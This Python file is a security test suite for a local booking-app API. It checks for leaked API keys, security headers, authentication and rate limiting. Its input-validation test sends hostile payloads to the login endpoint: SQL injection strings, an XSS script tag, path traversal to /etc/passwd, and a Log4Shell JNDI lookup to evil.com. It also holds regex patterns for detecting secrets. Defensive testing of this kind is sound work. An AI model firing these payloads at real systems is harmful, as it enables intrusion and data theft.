#!/usr/bin/env python3
"""
Comprehensive Security Validation Test Suite
Tests all security fixes and validates protection mechanisms
"""

import requests
import json
import re
import os
from typing import Dict, List, Any
from datetime import datetime

class SecurityValidator:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.results = {
            "timestamp": datetime.now().isoformat(),
            "tests": {},
            "summary": {
                "total": 0,
                "passed": 0,
                "failed": 0,
                "critical_issues": []
            }
        }
    
    def test_api_key_exposure(self) -> bool:
        """Test that API keys are not exposed in responses"""
        print("🔐 Testing API key exposure...")
        
        try:
            # Test various endpoints for API key leakage
            endpoints = [
                "/api/v2/health/",
                "/api/v2/auth/me",
                "/docs",
                "/api/v2/users/profile"
            ]
            
            for endpoint in endpoints:
                response = requests.get(f"{self.base_url}{endpoint}")
                content = response.text.lower()
                
                # Check for common API key patterns
                api_key_patterns = [
                    r'sk_live_\w+',
                    r'sk_test_\w+',
                    r'pk_live_\w+',
                    r'pk_test_\w+',
                    r'api[_-]?key["\']?\s*[:=]\s*["\']?\w+',
                    r'stripe[_-]?key["\']?\s*[:=]\s*["\']?\w+',
                    r'sendgrid[_-]?api[_-]?key["\']?\s*[:=]\s*["\']?\w+',
                    r'jwt[_-]?secret["\']?\s*[:=]\s*["\']?\w+'
                ]
                
                for pattern in api_key_patterns:
                    if re.search(pattern, content):
                        self.results["summary"]["critical_issues"].append(
                            f"API key pattern found in {endpoint}: {pattern}"
                        )
                        return False
            
            print("   ✅ No API keys exposed in responses")
            return True
            
        except Exception as e:
            print(f"   ❌ Error testing API key exposure: {e}")
            return False
    
    def test_csrf_protection(self) -> bool:
        """Test CSRF protection mechanisms"""
        print("🛡️ Testing CSRF protection...")
        
        try:
            # Test that POST requests require proper headers
            response = requests.post(f"{self.base_url}/api/v2/auth/login", 
                                   json={"email": "test@test.com", "password": "test"})
            
            # Should have CSRF protection headers
            csrf_headers = ['x-csrf-token', 'x-xsrf-token', 'csrf-token']
            has_csrf_protection = any(header in response.headers for header in csrf_headers)
            
            # Check for security headers
            security_headers = {
                'x-content-type-options': 'nosniff',
                'x-frame-options': 'DENY',
                'x-xss-protection': '1; mode=block'
            }
            
            missing_headers = []
            for header, expected_value in security_headers.items():
                if header not in response.headers:
                    missing_headers.append(header)
                elif response.headers[header] != expected_value:
                    missing_headers.append(f"{header} (incorrect value)")
            
            if missing_headers:
                self.results["summary"]["critical_issues"].append(
                    f"Missing security headers: {missing_headers}"
                )
                print(f"   ⚠️ Missing security headers: {missing_headers}")
            else:
                print("   ✅ Security headers present")
            
            return len(missing_headers) == 0
            
        except Exception as e:
            print(f"   ❌ Error testing CSRF protection: {e}")
            return False
    
    def test_authentication_flows(self) -> bool:
        """Test authentication and authorization flows"""
        print("🔑 Testing authentication flows...")
        
        try:
            # Test 1: Unauthenticated access to protected endpoint
            response = requests.get(f"{self.base_url}/api/v2/users/profile")
            if response.status_code != 401:
                self.results["summary"]["critical_issues"].append(
                    f"Protected endpoint accessible without auth: /api/v2/users/profile"
                )
                print(f"   ❌ Protected endpoint returned {response.status_code} instead of 401")
                return False
            
            print("   ✅ Protected endpoints require authentication")
            
            # Test 2: Invalid token handling
            headers = {"Authorization": "Bearer invalid_token"}
            response = requests.get(f"{self.base_url}/api/v2/users/profile", headers=headers)
            if response.status_code != 401:
                self.results["summary"]["critical_issues"].append(
                    "Invalid token not properly rejected"
                )
                print(f"   ❌ Invalid token returned {response.status_code} instead of 401")
                return False
            
            print("   ✅ Invalid tokens properly rejected")
            
            # Test 3: Rate limiting on auth endpoints
            login_url = f"{self.base_url}/api/v2/auth/login"
            attempts = 0
            for _ in range(10):  # Try 10 failed login attempts
                response = requests.post(login_url, json={
                    "email": "nonexistent@test.com",
                    "password": "wrongpassword"
                })
                attempts += 1
                if response.status_code == 429:  # Rate limited
                    print(f"   ✅ Rate limiting active after {attempts} attempts")
                    return True
            
            print("   ⚠️ No rate limiting detected (might be configured for higher limits)")
            return True
            
        except Exception as e:
            print(f"   ❌ Error testing authentication flows: {e}")
            return False
    
    def test_input_validation(self) -> bool:
        """Test input validation and sanitization"""
        print("🧹 Testing input validation...")
        
        try:
            # Test SQL injection attempts
            malicious_inputs = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "<script>alert('xss')</script>",
                "../../etc/passwd",
                "../../../../../etc/passwd",
                "${jndi:ldap://evil.com/a}"
            ]
            
            for malicious_input in malicious_inputs:
                # Test login endpoint
                response = requests.post(f"{self.base_url}/api/v2/auth/login", json={
                    "email": malicious_input,
                    "password": malicious_input
                })
                
                # Should return 400 (bad request) or 422 (validation error)
                if response.status_code == 200:
                    self.results["summary"]["critical_issues"].append(
                        f"Malicious input accepted: {malicious_input[:20]}..."
                    )
                    print(f"   ❌ Malicious input accepted: {malicious_input[:20]}...")
                    return False
            
            print("   ✅ Input validation working properly")
            return True
            
        except Exception as e:
            print(f"   ❌ Error testing input validation: {e}")
            return False
    
    def test_data_encryption(self) -> bool:
        """Test that sensitive data is properly encrypted"""
        print("🔒 Testing data encryption...")
        
        try:
            # Check that passwords are hashed (not plaintext)
            # This would require database access, so we'll test the API response
            response = requests.post(f"{self.base_url}/api/v2/auth/register", json={
                "email": "test_encryption@test.com",
                "password": "TestPassword123!",
                "first_name": "Test",
                "last_name": "User"
            })
            
            # Check that password is not returned in response
            if response.status_code in [200, 201] and "password" in response.text.lower():
                content = response.json()
                if "password" in str(content).lower():
                    self.results["summary"]["critical_issues"].append(
                        "Password returned in registration response"
                    )
                    print("   ❌ Password exposed in registration response")
                    return False
            
            print("   ✅ Sensitive data not exposed in responses")
            return True
            
        except Exception as e:
            print(f"   ❌ Error testing data encryption: {e}")
            return False
    
    def run_all_tests(self) -> Dict[str, Any]:
        """Run all security validation tests"""
        print("🔍 Starting comprehensive security validation...\n")
        
        tests = [
            ("api_key_exposure", self.test_api_key_exposure),
            ("csrf_protection", self.test_csrf_protection),
            ("authentication_flows", self.test_authentication_flows),
            ("input_validation", self.test_input_validation),
            ("data_encryption", self.test_data_encryption)
        ]
        
        for test_name, test_func in tests:
            try:
                result = test_func()
                self.results["tests"][test_name] = {
                    "passed": result,
                    "timestamp": datetime.now().isoformat()
                }
                self.results["summary"]["total"] += 1
                if result:
                    self.results["summary"]["passed"] += 1
                else:
                    self.results["summary"]["failed"] += 1
            except Exception as e:
                self.results["tests"][test_name] = {
                    "passed": False,
                    "error": str(e),
                    "timestamp": datetime.now().isoformat()
                }
                self.results["summary"]["total"] += 1
                self.results["summary"]["failed"] += 1
            
            print()  # Empty line between tests
        
        return self.results
    
    def print_summary(self):
        """Print test summary"""
        print("=" * 60)
        print("🔐 SECURITY VALIDATION SUMMARY")
        print("=" * 60)
        print(f"Total Tests: {self.results['summary']['total']}")
        print(f"Passed: {self.results['summary']['passed']}")
        print(f"Failed: {self.results['summary']['failed']}")
        
        if self.results['summary']['critical_issues']:
            print(f"\n❌ CRITICAL ISSUES FOUND ({len(self.results['summary']['critical_issues'])}):")
            for issue in self.results['summary']['critical_issues']:
                print(f"   - {issue}")
        else:
            print("\n✅ NO CRITICAL SECURITY ISSUES FOUND")
        
        print("\n📊 DETAILED TEST RESULTS:")
        for test_name, result in self.results['tests'].items():
            status = "✅ PASSED" if result['passed'] else "❌ FAILED"
            print(f"   {test_name}: {status}")
        
        print("=" * 60)

if __name__ == "__main__":
    validator = SecurityValidator()
    results = validator.run_all_tests()
    validator.print_summary()
    
    # Save results to file
    with open("/Users/bossio/6fb-booking/backend-v2/security_validation_results.json", "w") as f:
        json.dump(results, f, indent=2)
    
    print(f"\n💾 Results saved to: security_validation_results.json")
    
    # Exit with error code if critical issues found
    if results['summary']['critical_issues']:
        exit(1)
    else:
        exit(0)